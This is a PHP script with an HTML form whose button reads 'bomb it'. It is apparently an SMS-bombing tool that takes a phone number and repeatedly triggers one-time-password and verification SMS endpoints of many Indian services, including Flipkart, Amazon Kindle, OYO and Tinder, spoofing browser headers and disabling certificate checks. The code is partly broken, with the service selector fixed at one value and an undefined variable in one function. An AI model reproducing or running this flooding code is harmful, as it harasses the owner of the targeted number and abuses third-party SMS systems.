<html>
<body style="background-color:Cyan;"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<form method="POST" action=""><center>
  Number:<br>
  <input type="text" name="number"><br><br>
  <input type="submit" name="submit" value="bomb it"></center>
</form>
</html>



<?php

if(isset($_POST["submit"])) {
    $mobile=$_POST['number'];
    
    }




$x=0;

while (18 > $x){
$value=19;
//(rand(1,18));


if($value == 1) {
			redbus('https://m.redbus.in/api/sendOtp?number='.$mobile.'&cc=91');
		}
		if($value == 2) {
			bsnl('https://portal.bsnl.in/myportal/validatemobile.do',$mobile);
		}
		if($value == 3) {
			flipkart('https://www.flipkart.com/api/5/user/otp/generate',$mobile);
		}
		if($value == 4) {
			hike('http://api.im.hike.in/v3/account/validate?digits=4',$mobile);
		}
		if($value == 5) {
			justdial('https://www.justdial.com/functions/whatsappverification.php',$mobile);
		}
		if($value == 6) {
			kindle('https://www.amazon.in/kindle-dbs/ajax/SendSMSorEmail?ref_=kcpapp_snt_sms',$mobile);
		}
		if($value == 7) {
			lenskart('https://apimum.notifyvisitors.com/clients/lenskart/smsApi',$mobile);
		}
		if($value == 8) {
			mobiwik('https://webapi.mobikwik.com/p/account/otp/cell/v2',$mobile);
		}
		if($value == 9) {
			oyo('https://www.oyorooms.com/api/pwa/generateotp?phone='.$mobile.'&country_code=%2B91&nod=4');
		}
		if($value == 10) {
			spencers('https://www.spencers.in//sms/index/index',$mobile);
		}
		if($value == 11) {
			sulekha('https://myaccount.sulekha.com/network/userauthsulv2.aspx?mode=sendvcode&mobilenumber='.$mobile.'&rnd=0.535635589810822&callback=jQuery110208176050023941663_1559125529412',$mobile);
		}
		if($value == 12) {
			treebo('https://www.treebo.com/api/v2/auth/login/otp/',$mobile);
		}
		if($value == 13) {
			urbanclap('https://www.urbanclap.com/api/v3/customers/simplegenerateotp',$mobile);
		}
		if($value == 14) {
			wynk('https://sapi.wynk.in/music/v2/account/otp',$mobile);
		}
		if($value == 15) {
			yatra('https://secure.yatra.com/social/common/yatra/sendMobileOTP',$mobile);
		}
		if($value == 16) {
			dvotp('https://direct.delhivery.com/order/generate-otp?phoneNo='.$mobile);
		}
		if($value == 17) {
			confirmtkt('https://securedapi.confirmtkt.com/api/platform/register?mobileNumber='.$mobile.'&newOtp=true');
		}
		if($value == 18) {
			happily('https://backend.happilyunmarried.com/rest/V1/api/registrationsendsms?receiverPhoneNumber='.$mobile.'&email=iamtheowner@gmail.com&storeId=3&type=otp');
        }
        if($value == 19){
            tinder('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en0');
        }


        $x=$x+1;
}










function tinder($url){
    $data = array("phone_number"=>"91".$mobile);
    $data_string = json_encode($data);

   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,$data_string);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
       'content-type: application/json',
		'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}
function redbus($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'user-agent:: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36',
	'x-requested-with: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
}	
function happily($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'user-agent:: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36',
	'x-requested-with: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
}	
function confirmtkt($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'user-agent:: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36',
	'x-requested-with: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
}
function dvotp($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'user-agent:: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36',
	'x-requested-with: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
}
function bsnl($url,$mobile){
 
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"mobile=".$mobile."");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'Referer: https://portal.bsnl.in/myportal/authorize.do',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function flipkart($url,$mobile){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"loginId=+91".$mobile."");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
		'X-user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 FKUA/website/41/website/Desktop'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}
function hike($url,$mobile){
   $data = array("msisdn" => "+91".$mobile."","method" => "pin");
   $data_string = json_encode($data);
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,$data_string);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'User-Agent: android-5.15.22',
	'Content-Type: application/json',
	'Host: api.im.hike.in'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function justdial($url,$mobile){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"mob=".$mobile."&vcode=&rsend=0&name=ramesh");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function kindle($url,$mobile){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"recipient=+91".$mobile."&client=klite&communicationType=sms");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   'origin: https://www.amazon.in',
	'referer: https://www.amazon.in/kindle-dbs/fd/kcp',
	'content-type: application/x-www-form-urlencoded',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function lenskart($url,$mobile){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"mobile=".$mobile."&submit=1");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
		'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function mobiwik($url,$mobile){
 $data = array("cell" => $mobile);
 $data_string = json_encode($data);
 
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS, $data_string);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'Content-Type: application/json',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-MClient: 0'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function oyo($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "GET");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'user-agent:: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function spencers($url,$mobile){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"mobile=".$mobile."&action=register&email=");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function sulekha($url,$mobile){
 
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"mob=".$mobile."&vcode=&rsend=0&name=ramesh");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function treebo($url,$mobile){
  $data = array("phone_number" => $mobile);
  $data_string = json_encode($data);
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,$data_string);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'Content-Type: application/json',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function urbanclap($url,$mobile){
 $data = array("isd_code" => "+91","phone_wo_isd" => $mobile);

 $data_string = json_encode(array("country_id" => "IND","phone" =>$data,"device_type" => "customer"));
 
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS, $data_string);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'user-agent:: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Mobile Safari/537.36',
	'Content-Type:application/json',
	'x-requested-with: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
 
}
function wynk($url,$mobile){
	$data_string = json_encode(array("msisdn" => $mobile));
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,$data_string);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}	
function yatra($url,$mobile){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
   curl_setopt($curl, CURLOPT_POSTFIELDS,"isdCode=91&mobileNumber=".$mobile."");
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
	'X-Requested-With: XMLHttpRequest'
	)); 
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
   $ch = curl_exec($curl);
   curl_close($curl);
}
?>